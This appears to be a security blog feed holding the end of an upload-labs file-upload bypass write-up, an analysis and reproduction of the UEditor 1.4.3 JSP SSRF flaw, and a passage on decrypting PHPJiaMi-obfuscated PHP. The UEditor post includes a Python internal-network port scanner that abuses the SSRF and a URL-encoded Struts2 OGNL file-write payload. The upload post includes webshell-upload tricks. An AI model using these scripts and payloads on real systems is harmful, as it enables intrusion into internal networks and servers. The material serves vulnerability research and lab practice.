title="Pass-08"></a>Pass-08</h3><p>参考Pass-03的方法1、2、3、4</p><p>没有对字符串<code>::$DATA</code>进行操作，所以可以使用<code>8.php::$DATA</code>绕过</p><p><img src="08-01.png" alt="1527841099446"></p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>参考Pass-03的方法1、2、3、4</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>关键代码<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>当后缀名中出现黑名单列表中的内容时，就替换为空，所以可以用pphphp这样的后缀绕过。</p><p><img src="10-01.png" alt="1527833585243"></p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>%00截断即可</p><p>需关闭magic_quotes_gpc</p><p><img src="11-01.png" alt="1527816997321"></p><blockquote><p>集成环境中有该设置：<code>magic_quotes_gpc = Off</code></p></blockquote><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>%00截断即可，需要url解码</p><p>需关闭magic_quotes_gpc</p><p><img src="12-01.png" alt="1527817083878"></p><blockquote><p>集成环境中有该设置：<code>magic_quotes_gpc = Off</code></p></blockquote><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>题目已经更新，要求“保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码 ”</p><p>这里就以png格式图片为例</p><p><code>copy xwz.png/b + 1.txt 1111.png</code></p><p>其中xwz.png为正常的png图片，1.txt内容为<code>&lt;?php echo &quot;pwn&quot;;?&gt;</code></p><p>查看上传后的结果</p><p><img src="13-01.png" alt="1528079960735"></p><p>当然也可以直接用hex工具打开图片，在最后追加php代码。</p><blockquote><p>14-16和该题要求类似，统一按该方法处理。步骤省略。</p></blockquote><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>参考Pass-03方法1</p><p>文件名为：“17.php:.jpg”,上传成功后会生成一个17.php空文件，将文件名改为“17.&lt;&lt;&lt;”后再次上传</p><p><img src="17-01.png" alt="1528080850165"></p><p><img src="17-02.png" alt="1528080900372"></p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>save_name修改为“upload-19.php.”即可</p><p><img src="19-01.png" alt="1528081520987"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里面比较通杀的方法是采用<code>aaa.php:jpg</code> 的方法生成一个<code>aaa.php</code>的空文件，然后使用<code>aaa.&lt;&lt;&lt;</code>再次写入文件内容。可以参考<a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">当php邂逅windows通用上传缺陷</a>这篇文章，里面介绍的很详细。</p><p>本文主要用到的绕过方式有：</p><ol><li><p>修改js绕过（或者上传图片格式后抓包修改）</p></li><li><p>利用文件名<code>aaa.php:jpg</code> 的方法生成一个<code>aaa.php</code>的空文件，然后使用<code>aaa.&lt;&lt;&lt;</code>再次写入文件内容</p></li><li><p>使用<code>3.php::$DATA</code> 绕过</p></li><li><p>文件名进行小写绕过</p></li><li><p>“abc.php.” 绕过</p></li><li><p>“abc.pphphp”绕过</p></li><li><p>%00截断绕过</p></li><li><p>URL解码绕过（参考Pass-03)方法4</p></li></ol><p>本文只是给了部分解题的答案，没有过多的描述思路。每道题的解法也不是那么单一固定的。其中Pass-03到Pass-09都可以利用Pass-03的四种方法。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p></li><li><p><a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">https://www.waitalone.cn/php-windows-upload.html</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UEditor SSRF漏洞(JSP版本)分析与复现</title>
      <link href="/2018/05/25/UEditor-SSRF-In-JSP/"/>
      <url>/2018/05/25/UEditor-SSRF-In-JSP/</url>
      
        <content type="html"><![CDATA[<p>前些时间测试的时候遇到了一个系统采用了UEditor编辑器，版本为1.4.3。已知该编辑器v1.4.3版本（jsp)存在SSRF漏洞，虽然是Bool型的SSRF，除了可以进行内网探测外，也可以根据web应用指纹信息，之后进行进一步的测试。</p><a id="more"></a><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>查看官方的<a href="http://ueditor.baidu.com/website/changelog.html" target="_blank" rel="noopener">更新日志</a>可以发现UEditor编辑器在版本1.4.3.1修复了SSRF漏洞。<img src="01.png" alt="01"></p><p>那版本1.4.3应该存在SSRF漏洞，本着能搜索就不动手的原则搜了一下，发现<code>wooyun-2015-0133125</code>中提到过这类的漏洞。但我这里是jsp版本的，里面提到jsp版本不一样，只好去分析一下漏洞产生的位置。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>那我们需要查看版本1.4.3与1.4.3.1有什么不同，从而找到存在问题的地方。该项目的代码托管在Github上，地址为：<a href="https://github.com/fex-team/ueditor/" target="_blank" rel="noopener">https://github.com/fex-team/ueditor/</a> 。</p><p>查看版本1.4.3.1下的<a href="https://github.com/fex-team/ueditor/tree/v1.4.3.1/jsp" target="_blank" rel="noopener">jsp代码</a>.</p><p><img src="02.png" alt="02"></p><p>可以发现在该版本有一次commit，commitId 为<code>a1820147cfc3fbe2960a7d99f8dfbe338c02f0b6</code>。根据字面意思应该是增加了修复SSRF的代码。</p><p>下载下来后对比一下v1.4.3.1和v1.4.3代码有什么不同(这里仅对比jsp下的代码)。</p><p><img src="03.png" alt="03"></p><p>发现在v1.4.3.1中修改了jsp/src/com/baidu/ueditor/hunter/ImageHunter.java的<code>validHost</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">validHost</span> <span class="params">( String hostname )</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">InetAddress ip = InetAddress.getByName(hostname);<span class="comment">//根据主机名获取ip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ip.isSiteLocalAddress()) &#123;<span class="comment">//是否为地区本地地址</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !filters.contains( hostname );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增了对ip地址是否为内部地址的判断。而在v1.4.3中仅仅是做了是否为过滤的ip地址。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">validHost</span> <span class="params">( String hostname )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !filters.contains( hostname );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isSiteLocalAddress</code>方法作用是当IP地址是地区本地地址（SiteLocalAddress）时返回true，否则返回false。</p><blockquote><p>IPv4的地址本地地址分为三段：10.0.0.0 ~ 10.255.255.255、172.16.0.0 ~ 172.31.255.255、192.168.0.0 ~ 192.168.255.255。</p></blockquote><p>搜索后发现在<code>captureRemoteData</code>中调用了<code>validHost</code>方法。</p><p> <img src="04.png" alt="05"></p><p>根据代码可以分析：首先使用<code>validHost</code>对url进行判断，如果不合法，就提示“被阻止的远程主机”；当满足条件后会使用<code>validContentState</code>方法查看返回的状态是否为200，若不为200，则提示“远程连接出错”；进而对后缀、文件大小进行判断，都符合之后才进行图片的保存。如果url无法访问，则提示“抓取远程图片失败”。</p><p>所以可以根据返回的内容，来推断该url对应的主机是否可以访问。由于在版本v1.4.3中没有对请求的主机进行验证，从而造成了SSRF漏洞。</p><p>继续查看在<code>capture</code>方法中调用了<code>captureRemoteData</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> State <span class="title">capture</span> <span class="params">( String[] list )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">MultiState state = <span class="keyword">new</span> MultiState( <span class="keyword">true</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( String source : list ) &#123;</span><br><span class="line">state.addState( captureRemoteData( source ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> state;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>invoke</code>中调用了<code>capture</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">invoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> ( actionType == <span class="keyword">null</span> || !ActionMap.mapping.containsKey( actionType ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> BaseState( <span class="keyword">false</span>, AppInfo.INVALID_ACTION ).toJSONString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">State state = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> actionCode = ActionMap.getType( <span class="keyword">this</span>.actionType );</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ( actionCode ) &#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> ActionMap.CATCH_IMAGE:</span><br><span class="line">conf = configManager.getConfig( actionCode );</span><br><span class="line">String[] list = <span class="keyword">this</span>.request.getParameterValues( (String)conf.get( <span class="string">"fieldName"</span> ) );</span><br><span class="line">state = <span class="keyword">new</span> ImageHunter( conf ).capture( list );</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> state.toJSONString();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当调用<code>capture</code>需要满足条件为<code>actionCode</code>为<code>ActionMap.CATCH_IMAGE</code>，在<code>ActionMap</code>中value为<code>ActionMap.CATCH_IMAGE对应的</code>key为<code>catchimage。所以</code>当<code>actionType</code>值为<code>catchimage</code>，即<code>action</code>参数对应为<code>catchimage</code>时，才可能触发SSRF漏洞。下面对漏洞进行验证。</p><h2 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h2><p>这里用的是v1.4.3 jsp版本，下载ueditor1_4_3-utf8-jsp.zip，之后进行配置（可以参考<a href="http://fex.baidu.com/ueditor/#server-jsp）。" target="_blank" rel="noopener">http://fex.baidu.com/ueditor/#server-jsp）。</a></p><p><img src="05.png" alt="04"></p><p>功能实现的入口文件是jsp/controller.jsp。由上述分析可知需要满足<code>action</code>参数为<code>catchimage</code>。</p><p>在<code>case ActionMap.CATCH_IMAGE</code>中下断点，然后进行调试。</p><p>访问链接<a href="http://localhost:8088/jsp/controller.jsp?action=catchimage" target="_blank" rel="noopener">http://localhost:8088/jsp/controller.jsp?action=catchimage</a></p><p><img src="06.png" alt="1527146004264"></p><p>继续运行发现list为空，然后就抛出了异常。</p><p>再次运行，查看list数据从何而来。</p><p><img src="07.png" alt="1527146184688"></p><p>可以看出list的数据从浏览器source[]参数而来。这里source[]需要后缀为图片格式，具体可以查看config.js中的<code>catcherAllowFiles</code>。</p><p>已知192.168.135.133开启了tomcat服务，且端口为8080。我们这里访问一张不存在的图片，例如用UUID生成一张图片的名称。</p><p>构造请求链接：<a href="http://localhost:8088/jsp/controller.jsp?action=catchimage&amp;source[]=http://192.168.135.133:8080/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png" target="_blank" rel="noopener">http://localhost:8088/jsp/controller.jsp?action=catchimage&amp;source[]=http://192.168.135.133:8080/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png</a></p><p><img src="08.png" alt="1527151024365"></p><p>当进入<code>validHost</code>方法时，由于被访问的主机地址不在过滤的范围，所以返回true。</p><blockquote><p>这里可以发现，仅仅对<code>127.0.0.1</code>、<code>localhost</code>和<code>img.baidu.com</code>进行了限制，当ip为本地地址时并没有限制，从而可以进行内网探测。</p></blockquote><p><img src="09.png" alt="1527151160299"></p><p>而该图片由于不存在，所以状态码为404，到此抓取图片过程结束，并返回结果。</p><p>这里可以根据页面返回的结果不同，来判断该地址对应的主机端口是否开放。可以总结为以下几点：</p><ol><li>如果抓取不存在的图片地址时，页面返回<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519&quot;} ]}</code>，即state为“远程连接出错”。</li><li>如果成功抓取到图片，页面返回<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;SUCCESS&quot;,&quot;size&quot;: &quot;5103&quot;,&quot;source&quot;: &quot;http://192.168.135.133:8080/tomcat.png&quot;,&quot;title&quot;: &quot;1527173588127099881.png&quot;,&quot;url&quot;: &quot;/ueditor/jsp/upload/image/20180524/1527173588127099881.png&quot;} ]}</code>，即state为“SUCCESS”。</li><li>如果主机无法访问，页面返回<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25&quot;} ]}</code>，即state为“抓取远程图片失败”。</li></ol><blockquote><p>由于除了在config.js中的<code>catcherLocalDomain</code>配置了过滤的地址外，没有针对内部地址进行过滤，所以可以根据抓取远程图片返回结果的不同，来进行内网的探测。</p></blockquote><h2 id="0x04-代码实现"><a href="#0x04-代码实现" class="headerlink" title="0x04 代码实现"></a>0x04 代码实现</h2><p>由上述分析，根据返回包中的state进行判断，当state为<code>&quot;远程连接出错&quot;</code>或者为”SUCCESS”时表示该主机存在，且对应的端口为开放状态。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__Date__=<span class="string">"20180524"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">    python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.133</span></span><br><span class="line"><span class="string">python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.0/24</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Python version: 3.6.2</span></span><br><span class="line"><span class="string">requirements:IPy==0.83</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> IPy <span class="keyword">import</span> IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url,ip,port)</span>:</span></span><br><span class="line">url = <span class="string">'%s/jsp/controller.jsp?action=catchimage&amp;source[]=http://%s:%s/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png'</span> % (url,ip,port)</span><br><span class="line">res = requests.get(url)</span><br><span class="line">result = res.text</span><br><span class="line">result = result.replace(<span class="string">"list"</span>,<span class="string">"\"list\""</span>)</span><br><span class="line">res_json = json.loads(result)</span><br><span class="line">state = res_json[<span class="string">'list'</span>][<span class="number">0</span>][<span class="string">'state'</span>]</span><br><span class="line"><span class="keyword">if</span> state == <span class="string">'远程连接出错'</span> <span class="keyword">or</span> state == <span class="string">'SUCCESS'</span>:</span><br><span class="line">print(ip,port,<span class="string">'is Open'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(url,ip)</span>:</span></span><br><span class="line"></span><br><span class="line">ips = IP(ip)</span><br><span class="line">ports = [<span class="number">80</span>,<span class="number">8080</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">check(url,i,port)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">ip = sys.argv[<span class="number">2</span>]</span><br><span class="line">main(url,ip)</span><br></pre></td></tr></table></figure><blockquote><p>由于返回的结果为<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;...&quot;} ]}</code>并不能直接用json来解析，需要将list替换为”list”后才可以作为json来解析。当然也可以直接使用burp来测试。</p></blockquote><p>在实际测试中的测试结果如下：</p><p><img src="10.png" alt="1527148655823"></p><h2 id="0x05-综合利用"><a href="#0x05-综合利用" class="headerlink" title="0x05 综合利用"></a>0x05 综合利用</h2><p>对于这样的Bool型SSRF ，页面仅返回了状态，而没有更多别的信息，要想进一步利用，可以根据如下的思路：</p><p><code>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;查看结果</code></p><h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>首先进行内网探测，查看内网开放的主机和端口。这里以本地为例。</p><p>执行命令：</p><p><code>python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.155</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.135.155 80 is Open</span><br><span class="line"></span><br><span class="line">192.168.135.155 8080 is Open</span><br></pre></td></tr></table></figure><p>发现端口80 和 8080 开放，然后进行应用的识别。</p><h3 id="应用识别"><a href="#应用识别" class="headerlink" title="应用识别"></a>应用识别</h3><p>80端口由于没有可以识别的特征，所以未识别到应用的类型，而8080端口可以识别出来为tomcat服务器。</p><p><img src="11.png" alt="1527175485827"></p><p>然后尝试查看是否存在Struts2漏洞。</p><h3 id="攻击Payload"><a href="#攻击Payload" class="headerlink" title="攻击Payload"></a>攻击Payload</h3><p>由于在抓取远程图片时，会请求给出的URL地址，所以可以利用Struts2漏洞在内网服务器（这里为192.168.135.155）上写入一个后缀为图片格式（如png、jpg)的文件（因为只能抓取图片格式的文件，所以这里写入了图片后缀的文件），然后利用Ueditor抓取图片的功能，将写入的图片文件抓取到ueditor服务器中，然后访问图片查看攻击结果。</p><p>首先写文件，这里利用Struts2漏洞在内网服务器web项目下写入一个名字为b5e592d2-ab5b-476d-865a-8299a0625490.png的文件，内容为<code>Struts2_Test.png</code>。</p><p><img src="12.png" alt="1527181406261"></p><blockquote><p>这里之所以写入内容为<code>Struts2_Test.png</code>，是由于在抓取图片时会判断图片链接的后缀是否为图片格式。当然还有其他的写法，例如</p><p><a href="http://192.168.135.135:8080/Struts2_bugs-0.0.1-SNAPSHOT/test.action%3Fredirect%253A%24%257B%2523req%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%2523b%253D%2523req.getRealPath(%2522/%2522)%252B&#39;b5e592d2-ab5b-476d-865a-8299a0625490.png&#39;,%2523res%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%2523res.getWriter().print(%2522oko%2522),%2523res.getWriter().print(%2522kok%2522),%2523res.getWriter().flush(),%2523res.getWriter().close(),new%2520java.io.BufferedWriter(new%2520java.io.FileWriter(%2523b)).append(%2523req.getParameter(%2522shell%2522)).close()%257D%26shell%3DStruts2_Test&amp;aaa.png也可以写入。" target="_blank" rel="noopener">http://192.168.135.135:8080/Struts2_bugs-0.0.1-SNAPSHOT/test.action%3Fredirect%253A%24%257B%2523req%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%2523b%253D%2523req.getRealPath(%2522/%2522)%252B&#39;b5e592d2-ab5b-476d-865a-8299a0625490.png&#39;,%2523res%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%2523res.getWriter().print(%2522oko%2522),%2523res.getWriter().print(%2522kok%2522),%2523res.getWriter().flush(),%2523res.getWriter().close(),new%2520java.io.BufferedWriter(new%2520java.io.FileWriter(%2523b)).append(%2523req.getParameter(%2522shell%2522)).close()%257D%26shell%3DStruts2_Test&amp;aaa.png也可以写入。</a></p></blockquote><p>然后再次利用Ueditor抓取远程图片的功能将写入内网服务器的“图片文件”抓取下来，查看其内容。</p><p>这里需要抓取的图片地址为：<a href="http://192.168.135.155:8080/Struts2_bugs-0.0.1-SNAPSHOT/b5e592d2-ab5b-476d-865a-8299a0625490.png" target="_blank" rel="noopener">http://192.168.135.155:8080/Struts2_bugs-0.0.1-SNAPSHOT/b5e592d2-ab5b-476d-865a-8299a0625490.png</a></p><p><img src="13.png" alt="1527181487872"></p><p>由上图可以看出，最后抓取的文件保存地址为：<code>/ueditor/jsp/upload/image/20180525/1527181480175039672.png</code></p><h3 id="查看结果"><a href="#查看结果" class="headerlink" title="查看结果"></a>查看结果</h3><p>然后访问<a href="http://localhost:8088/ueditor/jsp/upload/image/20180525/1527181480175039672.png" target="_blank" rel="noopener">http://localhost:8088/ueditor/jsp/upload/image/20180525/1527181480175039672.png</a></p><p>查看是否攻击成功。</p><p><img src="14.png" alt="1527181545625"></p><p>表明攻击成功。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>由于UEditor在v1.4.3之前没有加入对内部IP的限制，所以在使用抓取图片的功能时，造成SSRF漏洞。可以进行内网服务器的探测。然后根据内网服务器的特征（如<code>/jmx-console/images/logo.gif</code>, <code>/tomcat.png）</code>，判断其使用的组件，并猜测可能存在的漏洞，然后进行进一步的渗透。</p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ueditor </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某PHP加密文件解密过程初探</title>
      <link href="/2018/02/08/Free-PhpJiaMi-Decrypt/"/>
      <url>/2018/02/08/Free-PhpJiaMi-Decrypt/</url>
      
        <content type="html"><![CDATA[<p>最近在52PJ上看到一篇关于PHP加密解密的帖子，过程非常详细，而且作者很负责，对于别人的回答也很热心。跟着动手做了一下，记录一下遇到的问题。这里针对的是PHP加密网站的免费加密进行的调试。</p><a id="more"></a><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>采用的IDE为VSCode，需要安装PHP DEBUG插件和XDebug 插件。<br>安装php debug插件比较简单，直接快捷键ctrl + shift + x  或者 “查看-扩展” 打开扩展面板。输入”php debug”搜索。<br><img src="01.jpg" alt="01"><br>然后安装即可。<br>其次是安装XDebug。安装可以参考:<a href="https://xdebug.org/docs/install" target="_blank" rel="noopener">https://xdebug.org/docs/install</a> 。首先查看一下PHP版本。我这里用的是5.5.30。<br><img src="02.jpg" alt="02"><br>打开php.ini，找到XDebug标签（我这里ext目录已经有xdebug.dll了，直接启用扩展即可）。如果没有XDebug标签，自己添加即可。<br><img src="03.jpg" alt="03"><br>打开扩展。<br><img src="04.png" alt="04"><br>注意设置<code>xdebug.remote_autostart = 1</code>。这样设置好debug和断点后，浏览器运行即可自动命中断点。<br>打开VSCode，设置编辑php的可执行文件路径。<br><img src="05.jpg" alt="05"><br>这样调试所需的环境就配置好了。使用时打开左侧的调试按钮，然后添加配置语言选择PHP。<br><img src="06.jpg" alt="06"><br>给代码添加断点后，点击开始调试按钮。浏览器访问时会在断点处停下，就可以进行调试了。<br><img src="07.jpg" alt="07"><br>乱码的话可以通过更改文件编码来设置。快捷键<code>Ctrl + Shift + P</code>，选择更改文件编码，找到合适的编码。<br><img src="08.jpg" alt="08"><br>php最大执行时间是30秒，超过30秒会自动终止，因此调试的时候要修改一下时间，在php.ini 文件中修改最大运行时间为5分钟。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max_execution_time = <span class="number">300</span></span><br></pre></td></tr></table></figure><h1 id="0x02-解密"><a href="#0x02-解密" class="headerlink" title="0x02 解密"></a>0x02 解密</h1><h4 id="1-独立加密"><a href="#1-独立加密" class="headerlink" title="1.独立加密"></a>1.独立加密</h4><p>上面环境已经准备好了，下面就开始正式工作了。首先需要获得一个加密的文件。我直接利用上面的文件去某加密网站进行加密。<br><img src="09.jpg" alt="09"><br>加密后大概是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/* PHP Encode by  http://Www.PHPJiaMi.Com/ */</span>error_reporting(<span class="number">0</span>);ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);<span class="keyword">if</span>(!defined(<span class="string">'kcapwkef'</span>))&#123;define(<span class="string">'kcapwkef'</span>,<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(!function_exists(<span class="string">"�㒁�؁��"</span>))&#123;<span class="function"><span class="keyword">function</span> �����ٹ�<span class="params">($������)</span></span>&#123;<span class="keyword">global</span>$Đ���Л�,$�……</span><br></pre></td></tr></table></figure><p>使用PHP-Parser对代码进行格式化，便于调试。<br>执行命令<code>composer require nikic/php-parser</code><br><img src="10.jpg" alt="10"><br>利用作者的format.php将代码格式化。代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line">$code = file_get_contents(<span class="string">'9014/t.php'</span>);</span><br><span class="line">$parser = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $ast = $parser-&gt;parse($code);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Error $error) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Parse error: &#123;$error-&gt;getMessage()&#125;\n"</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$prettyPrinter 